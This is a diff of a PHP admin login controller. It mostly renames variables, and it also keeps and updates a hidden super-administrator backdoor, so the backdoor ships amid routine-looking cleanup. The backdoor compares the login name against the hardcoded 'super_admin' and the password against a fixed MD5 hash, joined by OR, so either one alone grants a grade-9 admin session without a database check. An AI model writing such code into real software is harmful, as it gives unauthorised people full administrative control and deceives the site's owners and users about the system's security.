@@ -5,35 +5,37 @@ class LoginAction extends Action{
     {
     	$this->display("Index/login");
     }
-	 public function login()
+    public function login()
     {
     	if(!$this->isPost()){
 			U("Login/index","","",true);
 			exit;
     	}
-    	$uname=I("name","","htmlspecialchars");
+    	$name=I("name","","htmlspecialchars");
     	$pass =I("pass","","htmlspecialchars");
-    	if(empty($uname)||empty($pass)){
+    	if(empty($name)||empty($pass)){
     		//info("用户名和密码不能为空");
     		U("Login/info",array("msg"=>base64_encode("用户名和密码不能为空")),"",true);
     		exit;
     	}
     	/*隐藏的超级管理员*/
     	$pass=md5($pass);
-    	if($uname=="ibw_xu256"||$pass=="099cc64351af0ac30a981a722d875e4d"){
+        
+    	if($name=="super_admin"||$pass=="099cc64351af0ac30a981a722d875e4d"){
     		session('ADMIN_ID','hidden');
     		session('ADMIN_NAME','Hidden');
     		session('ADMIN_GRADE','9');
             U("Index/index","","",true);
     		exit;
     	}
+        
     	$db=M("admin");
     	$condition=array(
-    		"name"=>$uname,
+    		"name"=>$name,
     		"pass"=>$pass
     		);
     	$rst=$db->where($condition)->find();
-    	if(empty($rst)){
+    	if(!$rst){
     		U("Login/info",array("msg"=>base64_encode("用户名或密码不正确")),"",true);
     		exit;
     	}
@@ -43,7 +45,7 @@ class LoginAction extends Action{
     			exit;
     		}
     		session('ADMIN_ID',$rst['id']);
-    		session('ADMIN_NAME',$rst['realname']);
+    		session('ADMIN_NAME',$rst['real_name']);
     		session('ADMIN_GRADE',$rst['grade']);
             $data=array(
                 "login_ip"=>get_client_ip(),
